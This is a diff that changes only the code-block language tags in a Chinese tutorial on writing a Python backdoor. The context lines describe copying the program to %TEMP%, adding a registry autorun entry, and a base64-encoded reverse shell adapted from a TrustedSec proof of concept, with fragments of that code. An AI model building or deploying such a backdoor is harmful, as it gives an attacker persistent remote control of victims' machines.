@@ -10,7 +10,7 @@
 
 下面的这一小段代码实现的功能就是把程序拷贝到%TEMP%目录下面并且修改了注册表,当用户登录到系统的时间就会执行这个后门:
 
-```
+```py
 import sys, base64, os, socket, subprocess
 from _winreg import *
 
@@ -43,7 +43,7 @@ def autorun(tempdir, fileName, run):
 
 现在我们已经把后门拷贝到了%TEMP%目录下面,并且给它添加了自动执行的权限,下面是一个 shell,通过一个 Python 脚本——[TrustedSec](https://www.trustedsec.com/files/RevShell_PoC_v1.py)来实现攻击,但是做了一点修改,对传输的文本做了一个 base64 编码.
 
-```
+```py
 def shell():
 #Base64 编码反向 shell
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -76,7 +76,7 @@ if __name__ == "__main__":
 
 下面是完整代码:
 
-```
+```py
 import sys, base64, os, socket, subprocess
 from _winreg import *
 
